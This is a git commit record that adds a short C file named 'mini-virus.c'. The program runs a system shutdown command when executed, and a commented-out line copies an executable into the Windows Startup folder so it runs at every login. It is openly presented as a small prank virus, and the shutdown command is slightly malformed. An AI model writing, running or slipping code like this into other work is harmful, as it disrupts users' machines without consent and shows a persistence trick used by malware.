630f2f4033d2e22d78ab2e1e9b166534058ac6a7
DeveloperSilambu <97620286+webDeveloperSilambu@users.noreply.github.com>
2023-10-10 06:22:52 +0530

    Add files via upload

---
+++ mini-virus.c
@@ -0,0 +1,8 @@
+#include<stdio.h>
+#include<dos.h>
+int main()
+{
+//     system("copy test.exe C:/Documents and Settings/All Users/Start Menu/Programs/Startup/");
+    system("shutdown /s /t");
+    return 0;
+}
